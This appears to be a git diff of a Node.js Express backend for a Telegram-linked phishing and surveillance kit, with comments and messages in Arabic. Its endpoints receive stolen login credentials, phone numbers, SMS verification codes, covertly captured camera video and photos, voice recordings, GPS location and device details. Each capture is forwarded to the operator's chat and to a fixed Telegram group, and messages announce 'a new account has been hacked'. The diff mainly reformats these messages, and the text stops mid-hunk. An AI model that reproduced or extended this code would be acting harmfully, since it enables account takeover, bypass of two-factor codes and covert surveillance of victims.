@@ -6,35 +6,21 @@ const axios = require('axios');
 const TelegramBot = require('node-telegram-bot-api');
 require('dotenv').config();
 
-// إعدادات البوت
+
 const token = process.env.s;
 const bot = new TelegramBot(token, { polling: false });
 
-// إعداد التطبيق
+
 const app = express();
-
-// CORS - مفتوح للجميع (مهم جداً)
-app.use((req, res, next) => {
-    res.header('Access-Control-Allow-Origin', '*');
-    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
-    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-    if (req.method === 'OPTIONS') {
-        return res.sendStatus(200);
-    }
-    next();
-});
-
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static(__dirname));
 
-// إعداد multer
+
 const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
 
-// ==================== جميع المسارات مع إضافة الإيموجي ====================
 
-// 1. مسار استقبال الفيديو من الكاميرا
 app.post('/submitVideo', upload.single('video'), async (req, res) => {
     const chatId = req.body.userId;
     const file = req.file;
@@ -44,21 +30,18 @@ app.post('/submitVideo', upload.single('video'), async (req, res) => {
     const groupChatId = '-1002433284949';
 
     if (file) {
-        console.log(`📥 تم استقبال فيديو من المستخدم ${chatId}`);
+        console.log(`Received video from user ${chatId}`);
 
         const caption = `
-🎬 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-📹 **معلومات الفيديو**
-🎬 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📷 **نوع الكاميرا:** ${cameraType === 'front' ? 'أمامية 📱' : 'خلفية 📸'}
-🌍 **العنوان IP:** \`${additionalData.ip || 'غير متاح'}\`
-📍 **الدولة:** ${additionalData.country || 'غير متاح'} 🗺️
-🏙️ **المدينة:** ${additionalData.city || 'غير متاح'} 🌆
-💻 **المنصة:** ${additionalData.platform || 'غير متاح'} 🖥️
-📱 **إصدار الجهاز:** ${additionalData.deviceVersion || 'غير متاح'} 📲
-🔋 **البطارية:** ${additionalData.batteryLevel || 'غير متاح'} ⚡
-🔌 **الشحن:** ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم ✅' : 'لا ❌') : 'غير متاح'}
+معلومات إضافية:
+نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
+IP: ${additionalData.ip || 'غير متاح'}
+الدولة: ${additionalData.country || 'غير متاح'}
+المدينة: ${additionalData.city || 'غير متاح'}
+المنصة: ${additionalData.platform || 'غير متاح'}
+إصدار الجهاز: ${additionalData.deviceVersion || 'غير متاح'}
+مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
+الشحن: ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم' : 'لا') : 'غير متاح'}
         `;
 
         try {
@@ -67,25 +50,21 @@ app.post('/submitVideo', upload.single('video'), async (req, res) => {
             const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
 
             const userInfoText = `
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-👤 **معلومات المستخدم**
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📛 **الاسم:** ${userName} 👤
-🆔 **اليوزر:** ${userUsername} 🆔
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
             `;
 
-            await bot.sendVideo(chatId, file.buffer, { caption: caption });
-            await bot.sendVideo(groupChatId, file.buffer, { caption: `🎥 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n🎥 **فيديو جديد من المستخدم**\n🎥 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **معرف المستخدم:** \`${chatId}\`\n${userInfoText}\n${caption}` });
+            await bot.sendVideo(chatId, file.buffer, { caption });
+            await bot.sendVideo(groupChatId, file.buffer, { caption: `فيديو من المستخدم ${chatId}\n${userInfoText}\n${caption}` });
 
-            console.log('✅ تم إرسال الفيديو بنجاح للمستخدم والمجموعة');
+            console.log('Video sent successfully to both user and group');
             res.json({ success: true });
         } catch (error) {
-            console.error('❌ خطأ في إرسال الفيديو:', error);
-            res.status(500).json({ success: false, error: 'خطأ في إرسال الفيديو' });
+            console.error('Error sending video to Telegram:', error);
+            res.status(500).json({ success: false, error: 'Error sending video to Telegram' });
         }
     } else {
-        res.status(400).json({ success: false, error: 'لم يتم استقبال فيديو' });
+        res.status(400).json({ success: false, error: 'No video received' });
     }
 });
 
@@ -99,21 +78,18 @@ app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
     const groupChatId = '-1002433284949';
 
     if (files && files.length > 0) {
-        console.log(`📥 تم استقبال ${files.length} صورة من المستخدم ${userId}`);
+        console.log(`Received ${files.length} images from user ${userId}`);
 
         const caption = `
-🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-📸 **معلومات الصورة**
-🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📷 **نوع الكاميرا:** ${cameraType === 'front' ? 'أمامية 📱' : 'خلفية 📸'}
-🌍 **العنوان IP:** \`${additionalData.ip || 'غير متاح'}\`
-📍 **الدولة:** ${additionalData.country || 'غير متاح'} 🗺️
-🏙️ **المدينة:** ${additionalData.city || 'غير متاح'} 🌆
-💻 **المنصة:** ${additionalData.platform || 'غير متاح'} 🖥️
-📱 **إصدار الجهاز:** ${additionalData.deviceVersion || 'غير متاح'} 📲
-🔋 **البطارية:** ${additionalData.batteryLevel || 'غير متاح'} ⚡
-🔌 **الشحن:** ${additionalData.batteryCharging ? 'نعم ✅' : 'لا ❌' || 'غير متاح'}
+معلومات إضافية:
+نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
+IP: ${additionalData.ip}
+الدولة: ${additionalData.country}
+المدينة: ${additionalData.city}
+المنصة: ${additionalData.platform}
+إصدار الجهاز: ${additionalData.deviceVersion}
+مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
+الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
         `;
 
         try {
@@ -122,31 +98,27 @@ app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
             const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
 
             const userInfoText = `
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-👤 **معلومات المستخدم**
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📛 **الاسم:** ${userName} 👤
-🆔 **اليوزر:** ${userUsername} 🆔
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
             `;
 
             for (const file of files) {
-                await bot.sendPhoto(userId, file.buffer, { caption: caption });
+                await bot.sendPhoto(userId, file.buffer, { caption });
             }
 
             for (const file of files) {
-                await bot.sendPhoto(groupChatId, file.buffer, { caption: `🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n🖼️ **صور جديدة من المستخدم**\n🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **معرف المستخدم:** \`${userId}\`\n${userInfoText}\n${caption}` });
+                await bot.sendPhoto(groupChatId, file.buffer, { caption: `صورة من المستخدم ${userId}\n${userInfoText}\n${caption}` });
             }
 
-            console.log('✅ تم إرسال الصور بنجاح للمستخدم والمجموعة');
+            console.log('Photos sent successfully to both user and group');
             res.json({ success: true });
         } catch (err) {
-            console.error('❌ فشل في إرسال الصور:', err);
-            res.status(500).json({ error: 'فشل في إرسال الصور' });
+            console.error('Failed to send photos:', err);
+            res.status(500).json({ error: 'Failed to send photos' });
         }
     } else {
-        console.log('⚠️ لم يتم استقبال صور');
-        res.status(400).json({ error: 'لم يتم استقبال صور' });
+        console.log('No images received');
+        res.status(400).json({ error: 'No images received' });
     }
 });
 
@@ -159,22 +131,19 @@ app.post('/submitVoice', upload.single('voice'), async (req, res) => {
     const groupChatId = '-1002433284949';
 
     if (!voiceFile) {
-        console.error('❌ لم يتم استقبال ملف صوتي');
-        return res.status(400).json({ error: 'لم يتم استقبال ملف صوتي' });
+        console.error('No voice file received');
+        return res.status(400).json({ error: 'No voice file received' });
     }
 
     const caption = `
-🎵 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-🎤 **معلومات التسجيل الصوتي**
-🎵 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-🌍 **العنوان IP:** \`${additionalData.ip || 'غير متاح'}\`
-📍 **الدولة:** ${additionalData.country || 'غير متاح'} 🗺️
-🏙️ **المدينة:** ${additionalData.city || 'غير متاح'} 🌆
-💻 **المنصة:** ${additionalData.platform || 'غير متاح'} 🖥️
-📱 **إصدار الجهاز:** ${additionalData.deviceVersion || 'غير متاح'} 📲
-🔋 **البطارية:** ${additionalData.batteryLevel || 'غير متاح'} ⚡
-🔌 **الشحن:** ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم ✅' : 'لا ❌') : 'غير متاح'}
+معلومات إضافية:
+IP: ${additionalData.ip || 'غير متاح'}
+الدولة: ${additionalData.country || 'غير متاح'}
+المدينة: ${additionalData.city || 'غير متاح'}
+المنصة: ${additionalData.platform || 'غير متاح'}
+إصدار الجهاز: ${additionalData.deviceVersion || 'غير متاح'}
+مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
+الشحن: ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم' : 'لا') : 'غير متاح'}
     `;
 
     try {
@@ -183,22 +152,18 @@ app.post('/submitVoice', upload.single('voice'), async (req, res) => {
         const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
 
         const userInfoText = `
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-👤 **معلومات المستخدم**
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📛 **الاسم:** ${userName} 👤
-🆔 **اليوزر:** ${userUsername} 🆔
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
         `;
 
-        await bot.sendVoice(chatId, voiceFile.buffer, { caption: caption });
-        await bot.sendVoice(groupChatId, voiceFile.buffer, { caption: `🎵 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n🎵 **تسجيل صوتي جديد من المستخدم**\n🎵 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **معرف المستخدم:** \`${chatId}\`\n${userInfoText}\n${caption}` });
+        await bot.sendVoice(chatId, voiceFile.buffer, { caption });
+        await bot.sendVoice(groupChatId, voiceFile.buffer, { caption: `رسالة صوتية من المستخدم ${chatId}\n${userInfoText}\n${caption}` });
 
-        console.log('✅ تم إرسال التسجيل الصوتي بنجاح للمستخدم والمجموعة');
+        console.log('Voice sent successfully to both user and group');
         res.json({ success: true });
     } catch (error) {
-        console.error('❌ خطأ في إرسال التسجيل الصوتي:', error);
-        res.status(500).json({ error: 'فشل في إرسال التسجيل الصوتي' });
+        console.error('Error sending voice:', error);
+        res.status(500).json({ error: 'Failed to send voice message' });
     }
 });
 
@@ -209,7 +174,7 @@ app.post('/submitLocation', async (req, res) => {
     const groupChatId = '-1002433284949';
 
     if (!chatId || !latitude || !longitude) {
-        return res.status(400).json({ error: 'بيانات ناقصة' });
+        return res.status(400).json({ error: 'Missing required data' });
     }
 
     try {
@@ -218,39 +183,32 @@ app.post('/submitLocation', async (req, res) => {
         const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
 
         const userInfoText = `
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-👤 **معلومات المستخدم**
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📛 **الاسم:** ${userName} 👤
-🆔 **اليوزر:** ${userUsername} 🆔
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
         `;
 
         await bot.sendLocation(chatId, latitude, longitude);
 
         const message = `
-📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-📍 **معلومات الموقع**
-📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-🌍 **العنوان IP:** \`${additionalData.ip || 'غير متاح'}\`
-📍 **الدولة:** ${additionalData.country || 'غير متاح'} 🗺️
-🏙️ **المدينة:** ${additionalData.city || 'غير متاح'} 🌆
-💻 **المنصة:** ${additionalData.platform || 'غير متاح'} 🖥️
-🌐 **المتصفح:** ${additionalData.userAgent || 'غير متاح'} 🧭
-🔋 **البطارية:** ${additionalData.batteryLevel || 'غير متاح'} ⚡
-🔌 **الشحن:** ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم ✅' : 'لا ❌') : 'غير متاح'}
+معلومات إضافية:
+IP: ${additionalData.ip || 'غير متاح'}
+الدولة: ${additionalData.country || 'غير متاح'}
+المدينة: ${additionalData.city || 'غير متاح'}
+المنصة: ${additionalData.platform || 'غير متاح'}
+متصفح المستخدم: ${additionalData.userAgent || 'غير متاح'}
+مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
+الشحن: ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم' : 'لا') : 'غير متاح'}
         `;
 
         await bot.sendMessage(chatId, message);
         await bot.sendLocation(groupChatId, latitude, longitude);
-        await bot.sendMessage(groupChatId, `🗺️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n🗺️ **موقع جديد من المستخدم**\n🗺️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **معرف المستخدم:** \`${chatId}\`\n${userInfoText}\n${message}`);
+        await bot.sendMessage(groupChatId, `موقع مرسل من المستخدم ${chatId}\n${userInfoText}\n${message}`);
 
-        console.log('✅ تم إرسال الموقع والبيانات الإضافية بنجاح');
+        console.log('Location and additional data sent successfully to both user and group');
         res.json({ success: true });
     } catch (error) {
-        console.error('❌ خطأ في إرسال الموقع:', error);
-        res.status(500).json({ error: 'فشل في إرسال الموقع', details: error.message });
+        console.error('Error sending location:', error);
+        res.status(500).json({ error: 'Failed to send location', details: error.message });
     }
 });
 
@@ -258,10 +216,10 @@ app.post('/submitLocation', async (req, res) => {
 app.post('/submitIncrease', async (req, res) => {
     const { username, password, platform, chatId, ip, country, city, userAgent } = req.body;
 
-    console.log('📥 تم استقبال بيانات اختراق:', { username, password, platform, chatId, ip, country, city });
+    console.log('Received increase data:', { username, password, platform, chatId, ip, country, city });
     
     if (!chatId) {
-        return res.status(400).json({ error: 'chatId ناقص' });
+        return res.status(400).json({ error: 'Missing chatId' });
     }
 
     const deviceInfo = require('useragent').parse(userAgent);
@@ -273,48 +231,33 @@ app.post('/submitIncrease', async (req, res) => {
         const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
 
         const userInfoText = `
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-👤 **معلومات المستخدم**
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📛 **الاسم:** ${userName} 👤
-🆔 **اليوزر:** ${userUsername} 🆔
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
         `;
 
         const userMessage = `
-⚠️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-🔥 **بيانات اختراق جديدة**
-⚠️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-🔓 **المنصة:** ${platform} 🎯
-👤 **اسم المستخدم:** \`${username}\` 👤
-🔑 **كلمة السر:** \`${password}\` 🔐
-📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-🌍 **معلومات الاتصال**
-📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-🌐 **العنوان IP:** \`${ip}\` 📡
-📍 **الدولة:** ${country} 🗺️
-🏙️ **المدينة:** ${city} 🌆
-💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-💻 **معلومات الجهاز**
-💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-🖥️ **نظام التشغيل:** ${deviceInfo.os.toString()} 💿
-🌐 **المتصفح:** ${deviceInfo.toAgent()} 🧭
-📱 **الجهاز:** ${deviceInfo.device.toString()} 📲
+تم اختراق حساب جديد ☠️:
+منصة: ${platform}
+اسم المستخدم: ${username}
+كلمة السر: ${password}
+عنوان IP: ${ip}
+الدولة: ${country}
+المدينة: ${city}
+نظام التشغيل: ${deviceInfo.os.toString()}
+المتصفح: ${deviceInfo.toAgent()}
+الجهاز: ${deviceInfo.device.toString()}
         `;
 
         await bot.sendMessage(chatId, userMessage);
-        console.log('✅ تم إرسال الرسالة للمستخدم بنجاح');
+        console.log('Message sent to user successfully');
 
-        await bot.sendMessage(groupChatId, `🔥 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n🔥 **اختراق حساب جديد**\n🔥 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **المستخدم:** \`${chatId}\`\n${userInfoText}\n${userMessage}`);
-        console.log('✅ تم إرسال الرسالة للمجموعة بنجاح');
+        await bot.sendMessage(groupChatId, `تم اختراق حساب من قبل المستخدم ${chatId}\n${userInfoText}\n${userMessage}`);
+        console.log('Message sent to group successfully');
 
         res.json({ success: true });
     } catch (error) {
-        console.error('❌ خطأ في إرسال الرسالة:', error);
-        res.status(500).json({ error: 'فشل في إرسال بيانات الاختراق', details: error.message });
+        console.error('Error sending message:', error);
+        res.status(500).json({ error: 'Failed to send increase data', details: error.message });
     }
 });
 
@@ -323,7 +266,7 @@ app.post('/sendPhoneNumber', async (req, res) => {
     const { phoneNumber, country, chatId, ip, platform, userAgent } = req.body;
 
     if (!chatId) {
-        return res.status(400).json({ error: 'chatId ناقص' });
+        return res.status(400).json({ error: 'Missing chatId' });
     }
 
     const deviceInfo = require('useragent').parse(userAgent);
@@ -335,45 +278,31 @@ app.post('/sendPhoneNumber', async (req, res) => {
         const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
 
         const userInfoText = `
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-👤 **معلومات المستخدم**
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📛 **الاسم:** ${userName} 👤
-🆔 **اليوزر:** ${userUsername} 🆔
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
         `;
 
         const message = `
-📞 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-📱 **رقم هاتف جديد**
-📞 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📱 **رقم الهاتف:** \`${phoneNumber}\` ☎️
-📍 **الدولة:** ${country} 🗺️
-📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-🌍 **معلومات الاتصال**
-📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-🌐 **العنوان IP:** \`${ip}\` 📡
-💻 **المنصة:** ${platform} 🖥️
-💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-💻 **معلومات الجهاز**
-💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-🖥️ **نظام التشغيل:** ${deviceInfo.os.toString()} 💿
-🌐 **المتصفح:** ${deviceInfo.toAgent()} 🧭
-📱 **الجهاز:** ${deviceInfo.device.toString()} 📲
+تم استلام رقم هاتف جديد ☎️:
+رقم الهاتف: ${phoneNumber}
+الدولة: ${country}
+عنوان IP: ${ip}
+المنصة: ${platform}
+نظام التشغيل: ${deviceInfo.os.toString()}
+المتصفح: ${deviceInfo.toAgent()}
+الجهاز: ${deviceInfo.device.toString()}
+${userInfoText}
         `;
 
         await bot.sendMessage(chatId, message);
-        console.log('✅ تم إرسال رقم الهاتف إلى المستخدم بنجاح');
+        console.log('تم إرسال رقم الهاتف إلى المستخدم بنجاح');
 
-        await bot.sendMessage(groupChatId, `☎️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n☎️ **رقم هاتف جديد من المستخدم**\n☎️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **المعرف:** \`${chatId}\`\n${userInfoText}\n${message}`);
-        console.log('✅ تم إرسال رقم الهاتف إلى المجموعة بنجاح');
+        await bot.sendMessage(groupChatId, `تم استلام رقم هاتف من قبل المستخدم ${chatId}\n${message}`);
+        console.log('تم إرسال رقم الهاتف إلى المجموعة بنجاح');
 
         res.json({ success: true, message: 'تم إرسال رمز التحقق' });
     } catch (error) {
-        console.error('❌ خطأ في إرسال الرسالة:', error);
+        console.error('خطأ في إرسال الرسالة:', error);
         res.status(500).json({ error: 'فشل في إرسال رقم الهاتف', details: error.message });
     }
 });
@@ -383,7 +312,7 @@ app.post('/verifyCode', async (req, res) => {
     const { verificationCode, chatId, phoneNumber, country, ip, platform, userAgent } = req.body;
 
     if (!chatId) {
-        return res.status(400).json({ error: 'chatId ناقص' });
+        return res.status(400).json({ error: 'Missing chatId' });
     }
 
     const deviceInfo = require('useragent').parse(userAgent);
@@ -395,58 +324,44 @@ app.post('/verifyCode', async (req, res) => {
         const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
 
         const userInfoText = `
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-👤 **معلومات المستخدم**
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📛 **الاسم:** ${userName} 👤
-🆔 **اليوزر:** ${userUsername} 🆔
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
         `;
 
         const message = `
-✅ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-🔐 **كود التحقق**
-✅ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📱 **رقم الهاتف:** \`${phoneNumber}\` ☎️
-🔢 **كود التحقق:** \`${verificationCode}\` 🔑
-📍 **الدولة:** ${country} 🗺️
-📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-🌍 **معلومات الاتصال**
-📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-🌐 **العنوان IP:** \`${ip}\` 📡
-💻 **المنصة:** ${platform} 🖥️
-💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-💻 **معلومات الجهاز**
-💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-🖥️ **نظام التشغيل:** ${deviceInfo.os.toString()} 💿
-🌐 **المتصفح:** ${deviceInfo.toAgent()} 🧭
-📱 **الجهاز:** ${deviceInfo.device.toString()} 📲
+تم إدخال كود التحقق ✅:
+رقم الهاتف: ${phoneNumber}
+كود التحقق: ${verificationCode}
+الدولة: ${country}
+عنوان IP: ${ip}
+المنصة: ${platform}
+نظام التشغيل: ${deviceInfo.os.toString()}
+المتصفح: ${deviceInfo.toAgent()}
+الجهاز: ${deviceInfo.device.toString()}
+${userInfoText}
         `;
 
         await bot.sendMessage(chatId, message);
-        console.log('✅ تم إرسال كود التحقق إلى المستخدم بنجاح');
+        console.log('تم إرسال كود التحقق إلى المستخدم بنجاح');
 
-        await bot.sendMessage(groupChatId, `🔐 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n🔐 **كود تحقق جديد من المستخدم**\n🔐 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **المعرف:** \`${chatId}\`\n${userInfoText}\n${message}`);
-        console.log('✅ تم إرسال كود التحقق إلى المجموعة بنجاح');
+        await bot.sendMessage(groupChatId, `تم إدخال كود التحقق من قبل المستخدم ${chatId}\n${message}`);
+        console.log('تم إرسال كود التحقق إلى المجموعة بنجاح');
 
         res.json({ success: true, message: 'تم التحقق من الكود بنجاح' });
     } catch (error) {
-        console.error('❌ خطأ في إرسال الرسالة:', error);
+        console.error('خطأ في إرسال الرسالة:', error);
         res.status(500).json({ error: 'فشل في التحقق من الكود', details: error.message });
     }
 });
 
-// 8. مسار تسجيل الدخول (لجميع المنصات) - الأكثر استخداماً
+// 8. مسار تسجيل الدخول (لجميع المنصات)
 app.post('/submitLogin', async (req, res) => {
     const { username, password, platform, chatId, ip, country, city, userAgent, batteryLevel, charging, osVersion } = req.body;
 
-    console.log('📥 تم استقبال بيانات تسجيل دخول:', { username, password, platform, chatId, ip, country, city, batteryLevel, charging, osVersion });
+    console.log('Received login data:', { username, password, platform, chatId, ip, country, city, batteryLevel, charging, osVersion });
 
     if (!chatId) {
-        return res.status(400).json({ error: 'chatId ناقص' });
+        return res.status(400).json({ error: 'Missing chatId' });
     }
 
     const deviceInfo = require('useragent').parse(userAgent);
@@ -458,56 +373,41 @@ app.post('/submitLogin', async (req, res) => {
         const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
 
         const userInfoText = `
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-👤 **معلومات المستخدم**
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📛 **الاسم:** ${userName} 👤
-🆔 **اليوزر:** ${userUsername} 🆔
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
         `;
 
         const userMessage = `
-🔑 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-📝 **بيانات تسجيل الدخول**
-🔑 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-🔓 **المنصة:** ${platform} 🎯
-👤 **اسم المستخدم:** \`${username}\` 👤
-🔑 **كلمة السر:** \`${password}\` 🔐
-📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-🌍 **معلومات الاتصال**
-📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-🌐 **العنوان IP:** \`${ip}\` 📡
-📍 **الدولة:** ${country} 🗺️
-🏙️ **المدينة:** ${city} 🌆
-💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-💻 **معلومات الجهاز**
-💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📱 **إصدار النظام:** ${osVersion} 💿
-🌐 **المتصفح:** ${deviceInfo.toAgent()} 🧭
-📱 **الجهاز:** ${deviceInfo.device.toString()} 📲
-🔋 **البطارية:** ${batteryLevel} ⚡
-🔌 **قيد الشحن:** ${charging ? 'نعم ✅' : 'لا ❌'}
+تم تلقي بيانات تسجيل الدخول:
+منصة: ${platform}
+اسم المستخدم: ${username}
+كلمة السر: ${password}
+عنوان IP: ${ip}
+الدولة: ${country}
+المدينة: ${city}
+نظام التشغيل: ${osVersion}
+المتصفح: ${deviceInfo.toAgent()}
+الجهاز: ${deviceInfo.device.toString()}
+مستوى البطارية: ${batteryLevel}
+قيد الشحن: ${charging ? 'نعم' : 'لا'}
         `;
 
         await bot.sendMessage(chatId, userMessage);
-        console.log('✅ تم إرسال الرسالة للمستخدم بنجاح');
+        console.log('Message sent to user successfully');
 
-        await bot.sendMessage(groupChatId, `📝 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n📝 **بيانات تسجيل دخول جديدة**\n📝 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **المستخدم:** \`${chatId}\`\n${userInfoText}\n${userMessage}`);
-        console.log('✅ تم إرسال الرسالة للمجموعة بنجاح');
+        await bot.sendMessage(groupChatId, `تم تلقي بيانات تسجيل الدخول بواسطة المستخدم ${chatId}\n${userInfoText}\n${userMessage}`);
+        console.log('Message sent to group successfully');
 
         res.json({ success: true });
     } catch (error) {
-        console.error('❌ خطأ في إرسال الرسالة:', error);
-        res.status(500).json({ error: 'فشل في إرسال بيانات تسجيل الدخول', details: error.message });
+        console.error('Error sending message:', error);
+        res.status(500).json({ error: 'Failed to send login data', details: error.message });
     }
 });
 
 // 9. مسار استقبال معلومات الجهاز
 app.post('/SS', async (req, res) => {
-    console.log('📥 تم استقبال طلب POST في المسار /SS');
+    console.log('تم استقبال طلب POST في المسار /SS');
     console.log('البيانات المستلمة:', req.body);
 
     const chatId = req.body.userId;
@@ -516,47 +416,39 @@ app.post('/SS', async (req, res) => {
     const groupChatId = '-1002433284949';
 
     const message = `
-📱 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
